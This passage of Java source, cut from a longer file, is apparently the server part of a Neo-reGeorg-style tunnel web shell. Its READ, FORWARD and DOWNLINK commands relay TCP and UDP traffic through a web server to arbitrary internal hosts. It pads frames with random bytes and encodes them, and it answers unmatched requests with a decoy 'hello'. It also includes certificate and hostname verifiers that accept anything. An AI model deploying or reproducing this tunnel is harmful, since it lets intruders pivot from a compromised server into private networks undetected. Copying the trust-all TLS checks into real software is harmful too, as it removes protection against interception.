                    remoteWriteClosed.remove(mark);
                    remoteWriteNotified.remove(mark);
                    rinfo[STATUS] = "OK";
                } else if (cmd.compareTo("SHUT_WR") == 0) {
                    Object[] sessionSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    boolean halfCloseMode = ((Boolean)sessionSettings[3]).booleanValue();
                    if (!halfCloseMode) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Half-close mode is disabled";
                        out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET, (String)sessionSettings[4], ((Integer)sessionSettings[5]).intValue())));
                        out.flush();
                        out.close();
                        return false;
                    }
                    Object channel = sessions.get(mark);
                    if (channel instanceof SocketChannel) {
                        SocketChannel socketChannel = (SocketChannel)channel;
                        try {
                            socketChannel.socket().shutdownOutput();
                            rinfo[STATUS] = "OK";
                        } catch (Exception e) {
                            rinfo[STATUS] = "FAIL";
                            rinfo[ERROR] = e.toString();
                        }
                    } else {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Unsupported channel type";
                    }
                } else if (cmd.compareTo("DOWNLINK") == 0) {
                    Object[] responseSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    try {
                        long lastHeartbeat = System.currentTimeMillis();
                        long heartbeatInterval = 5000L;
                        while (true) {
                            Object[] frameInfo = new Object[40];
                            boolean closeAfterWrite = fillDownlinkFrame(frameInfo, mark, DATA, CMD, STATUS, ERROR, IP, PORT, UDPFRAG, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE, UDPMAXSIZE);
                            if ("HEARTBEAT".equals(frameInfo[CMD]) && System.currentTimeMillis() - lastHeartbeat < heartbeatInterval) {
                                Thread.sleep(50);
                                continue;
                            }
                            writeStreamFrame(out, frameInfo, BLV_L_OFFSET, (String)responseSettings[4], ((Integer)responseSettings[5]).intValue());
                            if ("HEARTBEAT".equals(frameInfo[CMD])) {
                                lastHeartbeat = System.currentTimeMillis();
                            }
                            if (closeAfterWrite) {
                                break;
                            }
                            Thread.sleep(50);
                        }
                    } catch (Exception e) {
                        Object[] frameInfo = new Object[40];
                        frameInfo[STATUS] = "FAIL";
                        frameInfo[ERROR] = e.toString();
                        writeStreamFrame(out, frameInfo, BLV_L_OFFSET, (String)responseSettings[4], ((Integer)responseSettings[5]).intValue());
                    }
                    out.close();
                    return false;
                } else if (cmd.compareTo("READ") == 0){
                    Object channel = sessions.get(mark);
                    Object[] sessionSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    int sessionReadbuf = ((Integer)sessionSettings[0]).intValue();
                    int sessionMaxread = ((Integer)sessionSettings[1]).intValue();
                    int sessionUdpfrag = ((Integer)sessionSettings[2]).intValue();
                    boolean sessionHalfClose = ((Boolean)sessionSettings[3]).booleanValue();
                    int sessionUdpTimeout = ((Integer)sessionSettings[6]).intValue();
                    if (channel instanceof SocketChannel) {
                        SocketChannel socketChannel = (SocketChannel)channel;
                        try {
                            ByteBuffer buf = ByteBuffer.allocate(sessionReadbuf);
                            int bytesRead = socketChannel.read(buf);
                            int maxRead = sessionMaxread;
                            int readLen = 0;
                            ByteArrayOutputStream readData = new ByteArrayOutputStream();
                            while (bytesRead != -1){
                                byte[] block = new byte[bytesRead];
                                System.arraycopy(buf.array(), 0, block, 0, bytesRead);
                                readData.write(block);
                                ((java.nio.Buffer)buf).clear();
                                readLen += bytesRead;
                                if (bytesRead < sessionReadbuf || readLen >= maxRead) {
                                    rinfo[STATUS] = "OK";
                                    rinfo[DATA] = readData.toByteArray();
                                    break;
                                }
                                bytesRead = socketChannel.read(buf);
                            }
                            if (bytesRead == -1) {
                                if (sessionHalfClose) {
                                    remoteWriteClosed.put(mark, Boolean.TRUE);
                                    rinfo[STATUS] = "OK";
                                    rinfo[DATA] = readData.toByteArray();
                                    Boolean notified = remoteWriteNotified.get(mark);
                                    if (notified == null || !notified.booleanValue()) {
                                        remoteWriteNotified.put(mark, Boolean.TRUE);
                                        rinfo[CMD] = "SHUT_WR";
                                    }
                                } else if (readData.size() > 0) {
                                    rinfo[STATUS] = "OK";
                                    rinfo[DATA] = readData.toByteArray();
                                } else {
                                    rinfo[STATUS] = "FAIL";
                                    rinfo[ERROR] = "Session is closed";
                                }
                            }   
                        } catch (Exception e) {
                            rinfo[STATUS] = "FAIL";
                            rinfo[ERROR] = e.toString();
                        } 
                    } else if (sessions.get(mark) instanceof java.util.Map) {
                        java.util.Map udpSession = (java.util.Map)sessions.get(mark);
                        DatagramChannel datagramChannel = (DatagramChannel)udpSession.get("channel");
                        java.util.LinkedList udpOut = (java.util.LinkedList)udpSession.get("out");
                        try {
                            Long lastActivity = (Long)udpSession.get("lastActivity");
                            if (lastActivity != null && System.currentTimeMillis() - lastActivity.longValue() > sessionUdpTimeout * 1000L) {
                                datagramChannel.close();
                                sessions.remove(mark);
                                rinfo[STATUS] = "FAIL";
                                rinfo[ERROR] = "Session is closed";
                                Object[] responseSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                                out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET, (String)responseSettings[4], ((Integer)responseSettings[5]).intValue())));
                                out.flush();
                                out.close();
                                return false;
                            }
                            if (!udpOut.isEmpty()) {
                                Object[] queued = (Object[])udpOut.removeFirst();
                                InetSocketAddress inetSender = (InetSocketAddress) queued[1];
                                rinfo[IP] = inetSender.getAddress().getHostAddress();
                                rinfo[PORT] = Integer.toString(inetSender.getPort());
                                Object[] fragment = (Object[]) queued[0];
                                rinfo[DATA] = (byte[])fragment[1];
                                if (fragment[0] != null) {
                                    rinfo[UDPFRAG] = (byte[])fragment[0];
                                }
                            } else if ( datagramChannel != null ) {
                                ByteBuffer buf = ByteBuffer.allocate(65497);
                                SocketAddress clientAddress = datagramChannel.receive(buf);
                                if (clientAddress != null) {
                                    buf.flip();
                                    int bytesReceived = buf.remaining();
                                    if (bytesReceived > 0) {
                                        udpSession.put("lastActivity", new Long(System.currentTimeMillis()));
                                        byte[] packetBytes = new byte[bytesReceived];
                                        buf.get(packetBytes);
                                        InetSocketAddress inetSender = (InetSocketAddress) clientAddress;
                                        Object[][] fragments = udpFragmentPayload(packetBytes, sessionUdpfrag);
                                        for (int i = 0; i < fragments.length; i++) {
                                            udpOut.add(new Object[]{fragments[i], inetSender});
                                        }
                                        if (!udpOut.isEmpty()) {
                                            Object[] queued = (Object[])udpOut.removeFirst();
                                            rinfo[IP] = inetSender.getAddress().getHostAddress();
                                            rinfo[PORT] = Integer.toString(inetSender.getPort());
                                            Object[] fragment = (Object[]) queued[0];
                                            rinfo[DATA] = (byte[])fragment[1];
                                            if (fragment[0] != null) {
                                                rinfo[UDPFRAG] = (byte[])fragment[0];
                                            }
                                        }
                                    }
                                }
                            }
                            rinfo[STATUS] = "OK";
                        } catch (Exception e) {
                            rinfo[STATUS] = "FAIL";
                            rinfo[ERROR] = e.toString();
                        }
                    } else {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Unknown channel type";
                    }

                } else if (cmd.compareTo("FORWARD") == 0){
                    Object channel = sessions.get(mark);
                    if (channel instanceof SocketChannel) {
                        SocketChannel socketChannel = (SocketChannel)channel;
                        try {
                            byte[] writeData = (byte[]) info[DATA];
                            ByteBuffer buf = ByteBuffer.allocate(writeData.length);
                            buf.put(writeData);
                            buf.flip();

                            while(buf.hasRemaining())
                                socketChannel.write(buf);

                            rinfo[STATUS] = "OK";

                        } catch (Exception e) {
                            rinfo[STATUS] = "FAIL";
                            rinfo[ERROR] = e.toString();
                            socketChannel.socket().close();
                        }
                    } else if (sessions.get(mark) instanceof java.util.Map) {
                        java.util.Map udpSession = (java.util.Map)sessions.get(mark);
                        DatagramChannel datagramChannel = (DatagramChannel)udpSession.get("channel");
                        try {
                            String target = (String) info[IP];
                            int port = Integer.parseInt((String) info[PORT]);
                            InetSocketAddress address = new InetSocketAddress(target, port);
                            byte[] writeData = (byte[]) info[DATA];
                            writeData = udpReassembleFragment((java.util.Map<Integer, Object[]>)udpSession.get("in"), writeData, (byte[]) info[UDPFRAG], UDPMAXSIZE);
                            udpSession.put("lastActivity", new Long(System.currentTimeMillis()));
                            if (writeData == null) {
                                rinfo[STATUS] = "OK";
                                Object[] sessionSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                                out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET, (String)sessionSettings[4], ((Integer)sessionSettings[5]).intValue())));
                                out.flush();
                                out.close();
                                return false;
                            }
                            ByteBuffer buf = ByteBuffer.allocate(writeData.length);
                            buf.put(writeData);
                            buf.flip();

                            while(buf.hasRemaining())
                                datagramChannel.send(buf, address);

                            rinfo[STATUS] = "OK";

                        } catch (Exception e) {
                            rinfo[STATUS] = "FAIL";
                            rinfo[ERROR] = e.toString();
                            datagramChannel.socket().close();
                        }
                    } else {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Unknown channel type";
                    }
                } else {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = "Unknown command: " + cmd;
                }
                Object[] responseSettings = getSettings(mark, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET, (String)responseSettings[4], ((Integer)responseSettings[5]).intValue())));
                out.flush();
                out.close();
            } else {
                out.write(new String(b64de(rogerHello)));
                out.flush();
                out.close();
            }
        } catch (Exception e){
        }
        return false;
    }


    public String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;
        int b1, b2, b3;
        while (i < len) {
            b1 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 0x3) << 4]);
                sb.append("==");
                break;
            }
            b2 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[((b1 & 0x03) << 4)
                        | ((b2 & 0xf0) >>> 4)]);
                sb.append(en[(b2 & 0x0f) << 2]);
                sb.append("=");
                break;
            }
            b3 = data[i++] & 0xff;
            sb.append(en[b1 >>> 2]);
            sb.append(en[((b1 & 0x03) << 4)
                    | ((b2 & 0xf0) >>> 4)]);
            sb.append(en[((b2 & 0x0f) << 2)
                    | ((b3 & 0xc0) >>> 6)]);
            sb.append(en[b3 & 0x3f]);
        }
        return sb.toString();
    }

    public String b64enCompact(byte[] data) {
        String encoded = b64en(data);
        while (encoded.endsWith("=")) {
            encoded = encoded.substring(0, encoded.length() - 1);
        }
        return encoded;
    }

    public void writeStreamFrame(Writer out, Object[] info, Integer offset, String compressionMode, int optimalLimit) throws Exception {
        String payload = b64enCompact(blv_encode_compact(info, offset, compressionMode, optimalLimit));
        out.write(String.format("%08x", payload.length()));
        out.write(payload);
        out.flush();
    }


    public byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;
        int b1, b2, b3, b4;
        while (i < len) {
            do {
                b1 = de[data[i++]];
            } while (i < len && b1 == -1);
            if (b1 == -1) {
                break;
            }
            do {
                b2 = de[data[i++]];
            } while (i < len && b2 == -1);
            if (b2 == -1) {
                break;
            }
            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }
                b3 = de[b3];
            } while (i < len && b3 == -1);
            if (b3 == -1) {
                break;
            }
            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }
                b4 = de[b4];
            } while (i < len && b4 == -1);
            if (b4 == -1) {
                break;
            }
            buf.write((int) (((b3 & 0x03) << 6) | b4));
        }
        return buf.toByteArray();
    }


    static String headerkey(String str) throws Exception {
        String out = "";
        for (String block: str.split("-")) {
            out += block.substring(0, 1).toUpperCase() + block.substring(1);
            out += "-";
        }
        return out.substring(0, out.length() - 1);
    }


    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            NetworkInterface nif = nifs.nextElement();
            Enumeration<InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                InetAddress addr = addresses.nextElement();
                if (addr instanceof Inet4Address)
                    if (addr.getHostAddress().equals(ip))
                        return true;
            }
        }
        return false;
    }


    public static Object[] blv_decode(byte[] data, Integer offset) {
        Object[] info = new Object[40];

        int i = 0;
        int data_len = data.length;
        int b;
        byte[] length = new byte[4];

        ByteArrayInputStream dataInput = new ByteArrayInputStream(data);

        while ( i < data_len ) {
            b = dataInput.read();
            dataInput.read(length, 0, length.length);
            int l = bytesToInt(length) - offset;
            byte[] v = new byte[l];
            dataInput.read(v, 0, v.length);
            i += ( 5 + l );
            if ( b > 1 && b <= 21 && b != 10 && b != 11 ) {
                info[b] = new String(v);
            } else {
                info[b] = v;
            }
        }
        if (info[1] != null && info[11] != null) {
            try {
                info[1] = zlibDecompress((byte[]) info[1]);
            } catch(Exception e) {
            }
        }

        return info;
    }


    public static byte[] blv_encode(Object[] info, Integer offset) {
        return blv_encode(info, offset, "optimal", 1024);
    }

    public static byte[] blv_encode(Object[] info, Integer offset, String compressionMode, int optimalLimit) {
        info[0]  = randBytes(5, 20);
        info[39] = randBytes(5, 20);
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        boolean dataCompressed = false;
        for (int b = 0; b < info.length; b++) {
            if ( info[b] != null ) {
                if (b == 11) {
                    continue;
                }
                Object o = info[b];
                byte[] v;
                if ( o instanceof String ){
                    v = ( (String) o ).getBytes();
                } else {
                    v = (byte[]) o;
                }
                if (b == 1 && shouldCompressData(compressionMode, v, optimalLimit)) {
                    v = zlibCompress(v, compressionLevel(compressionMode, v.length));
                    dataCompressed = true;
                }
                buf.write(b);
                try {
                    buf.write(intToBytes(v.length + offset));
                    buf.write(v);
                }catch(Exception e) {
                }
            }
        }
        if (dataCompressed) {
            byte[] v = "1".getBytes();
            buf.write(11);
            try {
                buf.write(intToBytes(v.length + offset));
                buf.write(v);
            } catch(Exception e) {
            }
        }
        return buf.toByteArray();
    }

    public static byte[] blv_encode_compact(Object[] info, Integer offset, String compressionMode, int optimalLimit) {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        boolean dataCompressed = false;
        for (int b = 0; b < info.length; b++) {
            if ( info[b] != null ) {
                if (b == 11) {
                    continue;
                }
                Object o = info[b];
                byte[] v;
                if ( o instanceof String ){
                    v = ( (String) o ).getBytes();
                } else {
                    v = (byte[]) o;
                }
                if (b == 1 && shouldCompressData(compressionMode, v, optimalLimit)) {
                    v = zlibCompress(v, compressionLevel(compressionMode, v.length));
                    dataCompressed = true;
                }
                buf.write(b);
                try {
                    buf.write(intToBytes(v.length + offset));
                    buf.write(v);
                }catch(Exception e) {
                }
            }
        }
        if (dataCompressed) {
            byte[] v = "1".getBytes();
            buf.write(11);
            try {
                buf.write(intToBytes(v.length + offset));
                buf.write(v);
            } catch(Exception e) {
            }
        }
        return buf.toByteArray();
    }

    public static int compressionLevel(String mode, int dataLen) {
        if ("optimal".equals(mode) || "smart".equals(mode)) return 1;
        if (dataLen <= 8192) return 1;
        if (dataLen <= 65536) return 3;
        return 6;
    }

    public static double byteEntropy(byte[] data) {
        if (data == null || data.length == 0) return 0.0;
        int[] counts = new int[256];
        for (int i = 0; i < data.length; i++) {
            counts[data[i] & 0xff] += 1;
        }
        double entropy = 0.0;
        for (int i = 0; i < counts.length; i++) {
            if (counts[i] == 0) continue;
            double probability = (double) counts[i] / (double) data.length;
            entropy -= probability * (Math.log(probability) / Math.log(2.0));
        }
        return entropy;
    }

    public static boolean shouldCompressData(String mode, byte[] data, int optimalLimit) {
        if (data == null) return false;
        if ("smart".equals(mode)) return data.length > 1024 && byteEntropy(data) < 7.5;
        if (data.length <= optimalLimit) return false;
        return "optimal".equals(mode) || "dynamic".equals(mode);
    }

    public static byte[] zlibCompress(byte[] data, int level) {
        Deflater deflater = new Deflater(level);
        try {
            deflater.setInput(data);
            deflater.finish();
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            while (!deflater.finished()) {
                int count = deflater.deflate(buffer);
                output.write(buffer, 0, count);
            }
            return output.toByteArray();
        } catch(Exception e) {
            return data;
        } finally {
            deflater.end();
        }
    }

    public static byte[] zlibDecompress(byte[] data) throws Exception {
        Inflater inflater = new Inflater();
        inflater.setInput(data);
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        while (!inflater.finished()) {
            int count = inflater.inflate(buffer);
            if (count == 0 && inflater.needsInput()) {
                break;
            }
            output.write(buffer, 0, count);
        }
        inflater.end();
        return output.toByteArray();
    }

    public static Object invokeMethod(Object obj, String methodName, Object[] args) throws Exception {
        Class[] argTypes = new Class[args.length];
        for (int i = 0; i < args.length; i++) {
            Class argType = args[i].getClass();
            if(Integer.class.isAssignableFrom(argType)){
                argType = int.class;
            }else if(Long.class.isAssignableFrom(argType)){
                argType = long.class;
            }else if(Short.class.isAssignableFrom(argType)){
                argType = short.class;
            }
            argTypes[i] = argType;
        }
        return invokeMethod2(obj, methodName, argTypes,args);
    }
    public static Object invokeMethod2(Object obj, String methodName, Class[] argTypes, Object[] args) throws Exception {
        Class clazz = obj.getClass();
        Method method = clazz.getMethod(methodName, argTypes);
        if (!method.isAccessible()){
            method.setAccessible(true);
        }
        return method.invoke(obj, args);
    }


    public static byte[] randBytes(int min, int max) {
        Random r = new Random();
        int len = r.nextInt((max - min) + 1) + min;
        byte[] randbytes = new byte[len];
        r.nextBytes(randbytes);
        return randbytes;
    }


    public static int bytesToInt(byte[] bytes) {
        int i;
        i =   (  bytes[3] & 0xff )
            | (( bytes[2] & 0xff ) << 8 )
            | (( bytes[1] & 0xff ) << 16)
            | (( bytes[0] & 0xff ) << 24);
        return i;
    }


    public static byte[] intToBytes(int value) {
        byte[] src = new byte[4];
        src[3] = (byte) (value & 0xFF);
        src[2] = (byte) ((value >> 8) & 0xFF);
        src[1] = (byte) ((value >> 16) & 0xFF);
        src[0] = (byte) ((value >> 24) & 0xFF);
        return src;
    }


    public boolean verify(String s, SSLSession sslSession) {
        return true;
    }


    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
